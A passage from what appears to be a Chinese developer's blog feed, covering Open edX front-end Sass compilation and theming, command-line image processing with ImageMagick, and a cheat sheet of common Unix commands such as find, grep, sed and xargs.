&lt;p&gt;此外更激动人心的一个项目是&lt;a href="https://github.com/edx/ux-pattern-library"&gt;ux-pattern-library&lt;/a&gt;，使用方法看这里:&lt;a href="https://github.com/edx/ux-pattern-library#use-and-deployment"&gt;Use and Deployment&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;我们带着任务来学习edx的前端机制，我关注的问题主要包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;edx是如何管理/编译静态文件的&lt;/li&gt;
&lt;li&gt;如何使edx前端能自适应&lt;/li&gt;
&lt;li&gt;是否可以直接采用css覆盖的方式来定制页面，这样一来是否就不需要编译&lt;/li&gt;
&lt;li&gt;如果采用theme机制修改scss文件，代码如何迅速生效而不是每次paver update_assets&lt;/li&gt;
&lt;li&gt;如何方便地调试，最好是定位到影响页面的scss元素&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h3&gt;探索一番&lt;/h3&gt;
&lt;p&gt;我们先进入到项目目录里随便瞧瞧，探索一番&lt;/p&gt;
&lt;p&gt;这篇文章写作动机主要针对edx的排版，所以暂时不打算讨论js相关的内容&lt;/p&gt;
&lt;p&gt;edx使用&lt;a href="https://github.com/sass/sass"&gt;sass&lt;/a&gt;来写CSS，关于sass是什么,可以看这里&lt;a href="http://www.ruanyifeng.com/blog/2012/06/sass.html"&gt;SASS用法指南&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这些文件位于目录：&lt;a href="https://github.com/edx/edx-platform/tree/named-release/dogwood.rc/lms/static/sass"&gt;edx-platform/lms/static/sass/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其中很多文件有ltr后缀，意思是left-to-right，为left-to-right排版的语言准备的，汉语和英语都是ltr风格的语言，阿拉伯语是rtl风格的语言&lt;/p&gt;
&lt;p&gt;我们在scss文件里经常看到&lt;code&gt;@import 'bourbon/bourbon';&lt;/code&gt;,bourbon位于&lt;a href="https://github.com/edx/edx-platform/tree/named-release/dogwood.rc/common/static/sass"&gt;edx-platform/common/static/sass&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;从&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/static/sass/lms-main-rtl.scss"&gt;lms-main-rtl.scss&lt;/a&gt;可以看到THEME-OVERRIDE是插入式的而不是覆盖式的&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// This comment is used by preprocess_assets.py to include resources from a&lt;/span&gt;
&lt;span class="c1"&gt;// theme, for old-style deprecated theming.&lt;/span&gt;
&lt;span class="c1"&gt;//&amp;lt;THEME-OVERRIDE&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;关于主题的实现暂时不作探索。&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/pavelib/assets.py#L305"&gt;update_assets&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;我对edx中静态文件最初的认识，来自&lt;code&gt;paver update_assets lms --settings=aws&lt;/code&gt;命令，这条命令会做许多工作，诸如编译sass/coffee，替换主题，收集静态文件等。&lt;/p&gt;
&lt;p&gt;我们来看看这块的机制&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/pavelib/assets.py#L305"&gt;update_assets&lt;/a&gt;命令来自&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/pavelib/assets.py"&gt;edx-platform/pavelib/assets.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过探索，我们可以回答&lt;code&gt;问题5&lt;/code&gt;了，通过传递debug参数给update_assets命令，compile_sass将&lt;code&gt;--sourcemap&lt;/code&gt;传给&lt;code&gt;sass&lt;/code&gt;命令，这样在编译scss的时候同时生成css.map文件，这个文件就是为调试scss而生的&lt;/p&gt;
&lt;p&gt;我们知道在浏览器调试面板中可以直接调试css文件，可css文件是由scss生成的，就是说影响最终界面的是css文件，而我们编写的确实scss，那么如何弥合这两者，map文件就是解决方案，在浏览器里我们可以直接看到影响布局的scss代码！想想就让人激动呀&lt;/p&gt;
&lt;p&gt;如何使用map文件，参考&lt;a href="http://thesassway.com/intermediate/using-source-maps-with-sass"&gt;Using source maps with Sass 3.3&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;use map to debug scss&lt;/h3&gt;
&lt;p&gt;首先把调试环境跑起来：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo /edx/bin/supervisorctl stop edxapp:
sudo  /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms runserver 0.0.0.0:5000 --settings devstack 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;然后生成css.map文件&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -H -u edxapp bash
&lt;span class="nb"&gt;source&lt;/span&gt; /edx/app/edxapp/edxapp_env
&lt;span class="nb"&gt;cd&lt;/span&gt; /edx/app/edxapp/edx-platform
paver update_assets lms --debug --settings&lt;span class="o"&gt;=&lt;/span&gt;aws
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;cypress和birch都有css.map文件，而dogwood没有了，应该是bug&lt;/p&gt;
&lt;p&gt;---2016.02.01
今天发现在dogwood中，&lt;code&gt;paver update_assets lms --settings=aws&lt;/code&gt;编译是会生成css.map文件的，之前可能由于&lt;code&gt;--settings=devstack&lt;/code&gt;的缘故&lt;/p&gt;
&lt;p&gt;之后打开浏览器，就可以开始调试啦&lt;/p&gt;
&lt;p&gt;我们可以一边调试一边开发，只需要实时观测scss文件的变化，每当变化自动编译为css&lt;/p&gt;
&lt;p&gt;新开一个tmux窗口执行&lt;code&gt;paver update_assets lms --debug --settings=aws --watch&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;theme机制&lt;/h3&gt;
&lt;p&gt;我们可以认为theme目录下的主题包下的文件会覆盖同名文件，这样一来我们需要定制前端页面的时候，就容易多啦。在这种机制下，之后主题包完全是插件式的了：）&lt;/p&gt;
&lt;p&gt;先来看下主题包的目录结构&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;my-theme
└── lms
    ├── static
    │   ├── images
    │   │   └── logo.png
    │   └── sass
    │       ├── _overrides.scss
    │       ├── lms-main-rtl.scss
    │       └── lms-main.scss
    └── templates
        ├── footer.html
        └── header.html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;具体案例可以参考&lt;a href="https://github.com/edx/edx-platform/tree/named-release/dogwood.rc/themes/edx.org"&gt;edx.org&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;工作流&lt;/h3&gt;
&lt;p&gt;至此，前端定制的工作流已经很明确了：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;启动开发环境&lt;/li&gt;
&lt;li&gt;编译生成css.map文件&lt;/li&gt;
&lt;li&gt;启动&lt;code&gt;paver update_assets --watch&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在浏览器调试面板里选择感兴趣的元素，观察影响其排版的scss文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下来是在主题包中定制的该文件的过程&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新建一个主题包，建议目录在edx-platform之外，纳入版本管理系统&lt;/li&gt;
&lt;li&gt;按照目标scss文件所在目录，在主题包中构建相应目录，在其中创建同名scss文件，写定制的排版规则&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;paver watch会为你自动编译变更，所以直接到浏览器里去调试就行啦&lt;/p&gt;
&lt;p&gt;工作流闭环完成&lt;/p&gt;
&lt;p&gt;至此，以上我感兴趣的5个问题，除了自适应，几乎全部解决，自适应的问题是排版本身的问题，和edx的前端机制倒没啥关系了&lt;/p&gt;
&lt;h3&gt;效果展示&lt;/h3&gt;
&lt;p&gt;&lt;img alt="sass0" src="img/edx/sass/sass0.png" /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img alt="sass1" src="img/edx/sass/sass1.png" /&gt;&lt;/p&gt;
&lt;h3&gt;案例&lt;/h3&gt;
&lt;p&gt;具体定制案例可以参考&lt;a href="https://github.com/Stanford-Online/edx-theme/blob/master/static/sass/_default.scss"&gt;Stanford-Online/edx-theme&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;当然这个案例有些过时，原因参考：&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/themes/README.rst"&gt;Comprehensive Theming&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;附录&lt;/h1&gt;
&lt;p&gt;探索过程中，顺便发现了跑dev的方法&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sed -ibak &lt;span class="s1"&gt;&amp;#39;s/ENV_ROOT.*/&amp;quot;edx.db&amp;quot;,/&amp;#39;&lt;/span&gt;  /edx/app/edxapp/edx-platform/envs/dev.py
sudo /edx/bin/supervisorctl stop edxapp:


sudo  /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms syncdb --settings dev 
sudo  /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms makemigrations --settings dev
sudo  /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms migrate --settings dev 
sudo  /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms runserver 0.0.0.0:5000 --settings dev 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;SASS与css模块化&lt;/h3&gt;
&lt;p&gt;SASS有助于css模块化，我们很多时候并不是从头开始一个项目的。不少人会使用一个 Sass 模板项目，包含了一些变量、mixin 和函数，Open edX就是这样一个项目。&lt;/p&gt;
&lt;p&gt;通过模块化，我们大致能猜到登录相关的布局应该通过修改&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/static/sass/views/_login-register.scss"&gt;sass/views/_login-register.scss&lt;/a&gt;，而通过修改&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/static/sass/views/_login-register.scss#L6"&gt;$sm-btn-google: #dd4b39;&lt;/a&gt;，我们可以调整google登录按钮的颜色，这样可以让开发更轻松一些。&lt;/p&gt;
&lt;p&gt;这样一来css文件被组织得井井有条，像大多的工程项目那样&lt;/p&gt;
&lt;h3&gt;关于css.map&lt;/h3&gt;
&lt;p&gt;这是一个辅助调试的文件，把scss编译完的文件（css）关联到原始的scss&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sass a.scss:a.css --sourcemap&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/wiki/Using-Grunt-Libsass-for-assets-managent-(WIP)"&gt;Using Grunt Libsass for assets managent (WIP)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 28 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-28:edx-front-dev.html</guid><category>edx</category></item><item><title>使用ImageMagick在命令行下处理图片</title><link>/use-ImageMagick.html</link><description>&lt;p&gt;一直不会用ps之类的处理软件，花花绿绿遍布按钮的界面令人很是头疼&lt;/p&gt;
&lt;p&gt;偶尔又有处理图片的需求，转化一下图片格式，或是调整一下图片尺寸&lt;/p&gt;
&lt;p&gt;每当遇到这种需求，总是习惯性地打开&lt;a href="http://xiuxiu.web.meitu.com/"&gt;美图秀秀网页版&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;对于批量处理图片，最好的方式当然是命令行了，一翻搜索，找到了&lt;a href="http://www.imagemagick.org/script/index.php"&gt;ImageMagick&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;ImageMagick&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;ImageMagick is a software suite to create, edit, compose, or convert bitmap images. It can read and write images in a variety of formats (over 200) including PNG, JPEG, JPEG-2000, GIF, TIFF, DPX, EXR, WebP, Postscript, PDF, and SVG. Use ImageMagick to resize, flip, mirror, rotate, distort, shear and transform images, adjust image colors, apply various special effects, or draw text, lines, polygons, ellipses and Bézier curves.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ImageMagick的强大可见一斑&lt;/p&gt;
&lt;p&gt;ImageMagick既提供命令行操作，当然你也可以选择你喜欢的语言的客户端，好比python的&lt;a href="https://github.com/dahlia/wand"&gt;wand&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Install&lt;/h3&gt;
&lt;p&gt;brew install ImageMagick&lt;/p&gt;
&lt;h3&gt;命令概览&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;convert：转换图像格式和大小，模糊，裁剪，驱除污点，抖动，临近，图片上画图片，加入新图片，生成缩略图等。 &lt;/li&gt;
&lt;li&gt;identify：描述一个或较多图像文件的格式和特性。 &lt;/li&gt;
&lt;li&gt;mogrify：Mogrify改写最初的图像文件然后写到一个不同的图像文件。 &lt;/li&gt;
&lt;li&gt;composite：根据一个图片或多个图片组合生成图片。 &lt;/li&gt;
&lt;li&gt;montage：创建一些分开的要素图像。在含有要素图像任意的装饰图片，如边框、结构、图片名称等。 &lt;/li&gt;
&lt;li&gt;display：如果你拥有一个X server的系统，它可以按次序的显示图片 &lt;/li&gt;
&lt;li&gt;animate：利用X server显示动画图片 &lt;/li&gt;
&lt;li&gt;import：在X server或任何可见的窗口上输出图片文件。 你可以捕获单一窗口，整个的荧屏或任何荧屏的矩形部分。用于截屏 &lt;/li&gt;
&lt;li&gt;conjure：解释执行 MSL (Magick Scripting Language) 写的脚本。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Usage(command-line)&lt;/h3&gt;
&lt;h3&gt;identify&lt;/h3&gt;
&lt;p&gt;identify var.jpg&lt;/p&gt;
&lt;p&gt;ImageMagick有一个小工具identify，它可以用来显示一个图片文件的详悉信息，比如格式、分辨率、大小、色深等等&lt;/p&gt;
&lt;h4&gt;begin&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;convert image.jpg image.png&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;文件名通配符&lt;/h4&gt;
&lt;p&gt;convert *.jpg images.gif&lt;/p&gt;
&lt;h4&gt;Built-in Images and Patterns&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;convert -size 640x480 pattern:checkerboard checkerboard.png 
convert -size 32x32 pattern:BRICKS BRICKS.png
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;所有可用的pattern参考&lt;a href="http://www.imagemagick.org/script/formats.php#builtin-patterns"&gt;Built-in Patterns&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;选取图片的某些帧(Selecting Frames)&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;convert &lt;span class="s1"&gt;&amp;#39;dog.gif[0]&amp;#39;&lt;/span&gt; dog.png
convert &lt;span class="s1"&gt;&amp;#39;images.gif[0-3]&amp;#39;&lt;/span&gt; images.mng
convert &lt;span class="s1"&gt;&amp;#39;images.gif[3,2,4]&amp;#39;&lt;/span&gt; images.mng
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;选取一张图片中的部分区域&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;convert -size 6000x4000 -depth 8 -extract 600x400+1900+2900 rgb:image image.jpg&lt;/code&gt;&lt;br /&gt;
我们要处理的图片是一个8位的 RGB 位图, 宽是 6000, 高为 4000, 而我们只需要获取一块中心附近 600×400 的图像信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;convert -crop 300x300+0+0 -resize 200x200 -colors 100 +profile "*" 1.jpg 1.png&lt;/code&gt; &lt;br /&gt;
把当前目录1.jpg图片文件，从左上角(0,0)坐标为起点，裁剪一块300x300像素的部分。&lt;/p&gt;
&lt;p&gt;convert -crop  100(长)x200(高)+10(x坐标)+10(y坐标)   22.jpg(源图片路径)   11.jpg(缩放后存放路径)    &lt;/p&gt;
&lt;h4&gt;缩放内嵌图像(缩略图)&lt;/h4&gt;
&lt;p&gt;convert '*.jpg' -resize 120x120 thumbnail%03d.png&lt;/p&gt;
&lt;h4&gt;裁切内嵌图像&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;convert &lt;span class="s1"&gt;&amp;#39;*.jpg&amp;#39;&lt;/span&gt; -crop 120x120+10+5 thumbnail%03d.png &lt;span class="c1"&gt;#or&lt;/span&gt;
convert &lt;span class="s1"&gt;&amp;#39;*.jpg[120x120+10+5]&amp;#39;&lt;/span&gt; thumbnail%03d.png
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;实用例子&lt;/h3&gt;
&lt;h5&gt;把图片变为黑白颜色&lt;/h5&gt;
&lt;p&gt;convert -monochrome foo.png bar.png  &lt;/p&gt;
&lt;h5&gt;添加图片水印处理&lt;/h5&gt;
&lt;p&gt;convert src.jpg logo.gif -gravity southeast -geometry +5+10 -composite dest.jpg  &lt;/p&gt;
&lt;p&gt;把名为logo.gif的水印图标添加在原始图片（src.jpg）右下角，且水印的下边缘距原始图片10像素、右边缘距原始图片5像素&lt;/p&gt;
&lt;p&gt;先安装ghostscript：&lt;code&gt;brew install ghostscript&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;convert  -fill red -pointsize 24 -draw "text 10,15 'lifesinger 2006' "  1.png  2.png&lt;/p&gt;
&lt;p&gt;convert  -fill green -pointsize 40 -draw "text 10,50 '添加中文'" 1.jpg 2.jpg  #添加中文&lt;/p&gt;
&lt;p&gt;mac下字体：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://support.apple.com/en-us/HT201722"&gt;Mac OS X: Font locations and their purposes
&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://gothick.org.uk/2008/03/14/using-os-x-fonts-in-imagemagick/"&gt;Using OS X fonts in ImageMagick&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;旋转&lt;/h5&gt;
&lt;p&gt;convert -rotate 30 foo.png bar.png&lt;/p&gt;
&lt;h5&gt;批量转化&lt;/h5&gt;
&lt;p&gt;mogrify -format png *.jpg #把目录下面所有的jpg文件转化为png格式&lt;/p&gt;
&lt;h5&gt;按百分比缩略图像&lt;/h5&gt;
&lt;p&gt;convert -resize 50%x50% foo.jpg thumbnail.jpg&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.imagemagick.org/script/command-line-processing.php"&gt;Command Line Processing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zouyesheng.com/imagemagick.html"&gt;ImageMagick命令行使用方法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.charry.org/docs/linux/ImageMagick/ImageMagick.html"&gt;我的ImageMagick使用心得&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 27 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-27:use-ImageMagick.html</guid><category>dev-tools</category></item><item><title>command tricks</title><link>/command-tricks.html</link><description>&lt;p&gt;列出一些常用的命令的参数和例子,方便自己查阅和上手&lt;/p&gt;
&lt;p&gt;建议采用command 小抄！！ &lt;/p&gt;
&lt;p&gt;&lt;code&gt;pip install cheat&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;例如：&lt;code&gt;cheat tar&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;find&lt;/h1&gt;
&lt;p&gt;find命令用来在指定目录下查找文件，默认以递归的方式&lt;/p&gt;
&lt;h3&gt;选项&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-maxdepth &amp;lt;目录层级&amp;gt; : 设置最大目录层级；
-exec &amp;lt;执行指令&amp;gt; : 假设find指令的回传值为True，就执行该指令；
-print：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为每列一个名称，每个名称前皆有“./”字符串；
-print0：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为全部的名称皆在同一行；
-printf &amp;lt;输出格式&amp;gt;：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式可以自行指定；
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;常见用法&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find /home -name &amp;quot;*.txt&amp;quot;  #在/home目录下查找以.txt结尾的文件名
find /home -iname &amp;quot;*.txt&amp;quot; #同上，但忽略大小写
find /usr/ -path &amp;quot;*local*&amp;quot; #匹配文件路径或者文件
find . -regex &amp;quot;.*\(\.txt\|\.pdf\)$&amp;quot; #基于正则表达式匹配文件路径
find . -iregex &amp;quot;.*\(\.txt\|\.pdf\)$&amp;quot; #同上，但忽略大小写

#根据文件时间戳进行搜索
find . -type f -atime -7  #搜索最近七天内被访问过的所有文件
find . -type f -amin +10  #搜索访问时间超过10分钟的所有文件

#根据文件类型进行搜索
find . -type 类型参数(f 普通文件/d 目录)


#根据文件大小进行匹配
find . -type f -size +10k  #搜索大于10KB的文件 (M:兆字节,G:吉字节)
find . -type f -size +1G   #搜索大于1G的文件

#根据文件权限/所有权进行匹配
find . -type f -user wwj  #找出当前目录用户wwj拥有的所有文件
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;grep&lt;/h1&gt;
&lt;p&gt;grep（global search regular expression(RE) and print out the line，全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。&lt;/p&gt;
&lt;h3&gt;选项&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-i : 不区分大小写地搜索。默认情况区分大小写 （ignore case）
-l : 只列出匹配的文件名 （ls？）
-r/R : 递归(recurse)搜索
-n : 显示行号信息（num）
-c : 计算符合pattern的列数。（count）
-C : 除了显示符合范本样式的那一列之外，并显示该列之前后的内容。
-v : 反转(reverse)查找（不匹配）
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;常见用法&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;grep match_pattern file_name 
grep &amp;quot;match_pattern&amp;quot; file_name
grep &amp;quot;match_pattern&amp;quot; file_name --color=auto #标记匹配颜色
grep -E &amp;quot;[1-9]+&amp;quot;  #使用正则表达式,等效于egrep
grep &amp;quot;text&amp;quot; . -r -n #当前目录下递归搜索
echo this is a text line | grep -e &amp;quot;is&amp;quot; -e &amp;quot;line&amp;quot; -o  #多种匹配方式
seq 10 | grep &amp;quot;5&amp;quot; -C 3  # 显示匹配某个结果的前三行和后三行
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;sed&lt;/h1&gt;
&lt;p&gt;sed是一种流编辑器，用程序的方式来编辑文本。sed 是基于行的，因此按顺序对每一行执行命令。&lt;br /&gt;
使用单引号来括起 sed 命令的习惯&lt;/p&gt;
&lt;h3&gt;选项&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;s : 替换指定字符
/g : 替换每一行中的所有匹配,当需要从第N处匹配开始替换时，可以使用 /Ng
d : 删除操作
-e: 允许在同一行里执行多条命令
a\ : 追加到行下，i\ 追加到行上
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;常见用法&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sed &amp;#39;s/book/books/&amp;#39; file #替换文本中的字符串
sed -n &amp;#39;s/test/TEST/p&amp;#39; file #-n选项和p命令一起使用表示只打印那些发生替换的行
sed -i &amp;#39;s/book/books/g&amp;#39; file #匹配file文件中每一行的第一个book替换为books
sed &amp;#39;s:test:TEXT:g&amp;#39; #可以使用任意的定界符
sed &amp;#39;/^$/d&amp;#39; file #删除空白行
sed &amp;#39;2,$d&amp;#39; file #删除文件的第2行到末尾所有行
sed &amp;#39;/^test/d&amp;#39; file #删除文件中所有开头是test的行
echo this is a test line | sed &amp;#39;s/\w\+/[&amp;amp;]/g&amp;#39; 
#[this] [is] [a] [test] [line]
echo this is digit 7 in a number | sed &amp;#39;s/digit \([0-9]\)/\1/&amp;#39;
#this is 7 in a number
sed -n &amp;#39;/test/,/check/p&amp;#39; file #test和check所确定的范围内的行都被打印
sed -n &amp;#39;5,/^test/p&amp;#39; file #打印从第5行开始到第一个包含以test开始的行之间的所有行
sed &amp;#39;/test/,/west/s/$/aaa bbb/&amp;#39; file #test和west之间的行，每行的末尾用字符串aaa bbb替换
sed -e &amp;#39;1,5d&amp;#39; -e &amp;#39;s/test/check/&amp;#39; file #第一条命令删除1至5行，第二条命令用check替换test
sed &amp;#39;/^test/a\this is a test line&amp;#39; file #将 this is a test line 追加到 以test 开头的行后面

#正则
sed -n &amp;#39;/[34]/ p &amp;#39; source.txt  #匹配包含3或4的行
sed -n &amp;#39;/^[0-9]\{3,5\}$/ p&amp;#39; numbers.txt
$sed -e &amp;#39;s/#.*//&amp;#39; -e &amp;#39;/^$/ d&amp;#39; /etc/profile #删除所有注释行和空行

#修改源文件和备份
sed -ibak &amp;#39;s/Ian/IAN/&amp;#39; source.txt #-i会修改源文件,但是可以同时使用bak备份
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;xargs&lt;/h1&gt;
&lt;p&gt;xargs命令是给其他命令传递参数的一个过滤器，也是组合多个命令的一个工具。&lt;br /&gt;
xargs的默认命令是echo，空格是默认定界符&lt;/p&gt;
&lt;p&gt;xargs与-exec的区别：-exec会为处理每一个匹配到的文件而发起一个相应的进程。可能占用过多资源。
而使用xargs命令则只有一个进程，顺序执行&lt;/p&gt;
&lt;h3&gt;选项&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-d : 指定定界符
-I : 指定一个替换字符串{}
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;常见用法&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;echo &amp;quot;nameXnameXnameXname&amp;quot; | xargs -dX  
#name name name name

echo &amp;quot;nameXnameXnameXname&amp;quot; | xargs -dX -n2 
#name name 
#name name

echo &amp;#39;axaxa&amp;#39; |xargs -dx -n1 -I {} echo b{}
#ba
#ba
#ba

ls *.jpg | xargs -n1 -I cp {} /data/images #复制所有图片文件到 /data/images 目录下
find . -type f -name &amp;quot;*.py&amp;quot; -print0 | xargs -0 wc -l  #统计python代码行数
#等效于find . -type f -name &amp;quot;*.py&amp;quot;  | xargs  wc -l 吧

cat url-list.txt | xargs wget -c #下载文件里的所有链接
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;seq&lt;/h1&gt;
&lt;p&gt;seq命令用于产生从某个数到另外一个数之间的所有整数&lt;/p&gt;
&lt;h3&gt;选项&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-f : 使用printf 样式的浮点格式
-s : 使用指定字符串分隔数字（默认使用：\n）
-w : 在列前添加0 使得宽度相同
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;常见用法&lt;/h3&gt;
&lt;p&gt;touch (seq -f "%03g-4.mp3" 1 10)&lt;/p&gt;
&lt;h1&gt;$()&lt;/h1&gt;
&lt;h3&gt;常见用法&lt;/h3&gt;
&lt;p&gt;cp gogs-repositories/ gogs-repositories_$(date "+%Y-%m%d") -R&lt;/p&gt;
&lt;h1&gt;tree&lt;/h1&gt;
&lt;h3&gt;选项&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-d : 仅显示目录
-L : 限制目录的最大深度
-C : 在文件和目录清单加上色彩，便于区分各种类型；
-f：在每个文件或目录之前，显示完整的相对路径名称；
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;常见用法&lt;/h3&gt;
&lt;p&gt;tree -ah --du&lt;/p&gt;
&lt;h1&gt;ln&lt;/h1&gt;
&lt;h3&gt;选项&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-s或--symbolic：对源文件建立符号连接，而非硬连接；
-d或-F或--directory：建立目录的硬连接；
-i或--interactive：覆盖既有文件之前先询问用户；
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;常见用法&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ln -s /usr/mengqc/mub1 /usr/liu/abc  #在目录/usr/liu下建立一个符号链接文件abc，使它指向目录/usr/mengqc/mub1
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;streams(input，output and redirect)&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/denysdovhan/bash-handbook#streams"&gt;streams&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;常见用法&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# output of ls will be written to list.txt
ls -l &amp;gt; list.txt

# append output to list.txt
ls -a &amp;gt;&amp;gt; list.txt

# all errors will be written to errors.txt
grep da * 2&amp;gt; errors.txt

# read from errors.txt
less &amp;lt; errors.txt
